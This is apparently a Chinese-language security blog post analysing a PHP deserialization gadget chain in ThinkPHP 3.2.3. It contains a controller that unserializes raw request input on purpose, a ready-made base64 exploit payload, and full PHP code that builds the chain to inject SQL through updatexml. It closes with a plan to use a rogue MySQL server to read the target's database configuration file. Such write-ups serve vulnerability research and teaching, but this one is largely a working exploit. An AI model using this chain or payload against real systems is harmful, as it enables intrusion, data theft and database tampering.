# ThinkPHP3.2.x 反序列化

Author: H3rmesk1t

Data: 2021.08.10

# 初始配置
- 这里利用ThinkPHP3.2.3做示例，[戳此进行下载](http://www.thinkphp.cn/donate/download/id/610.html)
- php的版本采用PHP5 (PHP7下起的ThinkPHP框架在调用有参函数时不传参数会触发框架里的错误处理)
- 下载后的源码中，需要对`Application/Home/Controller/IndexController.class.php`内容进行修改

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
    }
    public function d1no(){
        unserialize(base64_decode(file_get_contents('php://input')));
        phpinfo();
    }
}
```
# 漏洞利用

Payload

```shell
TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjYzOiJ0aGlua3BocC51c2VycyB3aGVyZSAxPXVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLHVzZXIoKSwweDdlKSwxKSMiO3M6NToid2hlcmUiO3M6MzoiMT0xIjt9fXM6NToiACoAZGIiO086MjE6IlRoaW5rXERiXERyaXZlclxNeXNxbCI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YToxOntpOjEwMDE7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo4OntzOjU6ImRlYnVnIjtpOjE7czo0OiJ0eXBlIjtzOjU6Im15c3FsIjtzOjg6ImRhdGFiYXNlIjtzOjg6InRoaW5rcGhwIjtzOjg6Imhvc3RuYW1lIjtzOjk6IjEyNy4wLjAuMSI7czo4OiJob3N0cG9ydCI7czo0OiIzMzA2IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo4OiJ1c2VybmFtZSI7czo4OiJ0aGlua3BocCI7czo4OiJwYXNzd29yZCI7czo4OiJ0aGlua3BocCI7fX19fX0=
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7e07b39f56f44f958cadb729f2718a98.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# 漏洞分析
## POP链分析

首先找一个链子的起点，全局搜索`__destruct`

![在这里插入图片描述](https://img-blog.csdnimg.cn/a8ead6d7416344fe9876f0591983e265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

查看后发现很多都是`free()`或者`fclose()`，其中有两个值得注意，分析后定位到其中的一个：`ThinkPHP\Library\Think\Image\Driver\Imagick.class.php`

![在这里插入图片描述](https://img-blog.csdnimg.cn/62595d3ad56a4a4dae91e0c59bf5842f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

这里的`$this->img`指的是本类中img这个成员变量，是完全可控的，并且调用了`$this->img`的`destroy()`，全局搜索该方法，来寻找一个含有`destroy()`成员方法的跳板类，跟进`ThinkPHP\Library\Think\Session\Driver\Memcache.class.php`

![在这里插入图片描述](https://img-blog.csdnimg.cn/9662ee8b5dee44b2862dabb552ce91c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

上一步中`Imagick::__destruct`中调用`destroy()`方法的时候并没有传值，那么这里形参`$sessID`是空的（这里就是为什么前面要用PHP5的原因，在PHP7下调用有参函数时不传参数会触发框架里的错误处理，从而报错），这里的`$this->handle`可控，并且调用了`$this->handle`的`delete()`方法，且传过去的参数是部分可控的，因此可以继续寻找有`delete()`方法的跳板类，跟进`ThinkPHP\Mode\Lite\Model.class.php`

![在这里插入图片描述](https://img-blog.csdnimg.cn/36b6474097bd4d799c48a84d74ba7f90.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

这里的`$pk`其实就是`$this->pk`，是完全可控的，下面的`$options`是从第一个跳板类传过来的，在第一个跳板类中可以控制其是否为空，`$this->options['where']`是成员属性，也是可控的，因此可以控制程序走到`return $this->delete($this->data[$pk]);`，在这里又调用了一次自己`$this->delete()`，但是这时候的参数`$this->data[$pk]`是可控的，这时`delete()`就可以成功带可控参数访问了，这是ThinkPHP的数据库模型类中的`delete()`方法，最终会去调用到数据库驱动类中的`delete()`中去，且代码中的一堆条件判断很显然都是可以控制的包括调用`$this->db->delete($options)`时的`$options`参数也可以控制，那么这时候就可以调用任意自带的数据库类中的`delete()`方法了

![在这里插入图片描述](https://img-blog.csdnimg.cn/d522d237a756406cb8ac8eea977ccf83.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`ThinkPHP\Library\Think\Db\Driver.class.php`，由于传入的参数是完全可控的，所以这里的`$table`是可控的，将`$table`拼接到`$sql`传入了`$this->execute()`

![在这里插入图片描述](https://img-blog.csdnimg.cn/0512627f037544c4bd2b9d69e6774e92.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`ThinkPHP\Library\Think\Db\Driver\Firebird.class.php`，这里有一个初始化数据库链接的方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/76c5f6f5f2b14ceb8a47f1692fc9bbca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`ThinkPHP\Library\Think\Db\Driver.class.php`，这里`initConnect`方法可以通过控制成员属性，使程序调用到`$this->connect()`

![在这里插入图片描述](https://img-blog.csdnimg.cn/eebc0008dddc4e78b07d08a03abee75a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`ThinkPHP\Library\Think\Db\Driver.class.php`，可以看到这里是去使用`$this->config`里的配置去创建了数据库连接，接着去执行前面拼接的`DELETE SQL语句`

![在这里插入图片描述](https://img-blog.csdnimg.cn/26c6d51be52f441694891696e506273c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## POP链构造

```php
<?php 
namespace Think\Image\Driver{
	use Think\Session\Driver\Memcache;
	class Imagick{
		private $img;

		public function __construct(){
			$this->img = new Memcache();
		}
	}
}

namespace Think\Session\Driver{
	use Think\Model;
	class Memcache{
		protected $handle;

		public function __construct(){
			$this->handle = new Model();
		}
	}
}

namespace Think{
	use Think\Db\Driver\Mysql;
	class Model{
		protected $options = array();
		protected $pk;
		protected $data = array();
		protected $db = null;

		public function __construct(){
			$this->db = new Mysql();
			$this->options['where'] = '';
			$this->pk = 'id';
			$this->data[$this->pk] = array(
				'table' ='thinkphp.users where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#',
				'where' ='1=1'
			);
		}
	}
}

namespace Think\Db\Driver{
	use PDO;
	class Mysql{
		protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE =true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    =1,
            'type'     ="mysql",
            "database" ="thinkphp",
            "hostname" ="127.0.0.1",
            "hostport" ="3306",
            "charset"  ="utf8",
            "username" ="thinkphp",
            "password" ="thinkphp"
        );
	}
}

namespace {
	echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}
?>
```
## 漏洞利用

此POP链的正常利用过程应该是：
- 通过某处leak出目标的数据库配置
- 触发反序列化
- 触发链中DELETE语句的SQL注入

但是如果只是这样，那么这个链子其实十分鸡肋，但是因为这里可以连接任意数据库，于是可以考虑利用MySQL恶意服务端读取客户端文件漏洞。

这样的话，利用过程就变成了：
- 通过某处leak出目标的WEB目录(e.g. DEBUG页面)
- 开启恶意MySQL恶意服务端设置读取的文件为目标的数据库配置文件
- 触发反序列化
- 触发链中PDO连接的部分
- 获取到目标的数据库配置
- 使用目标的数据库配置再次出发反序列化
- 触发链中DELETE语句的SQL注入

# 参考文章

可以查看参考文章来获取漏洞利用的更详细方式：[https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)
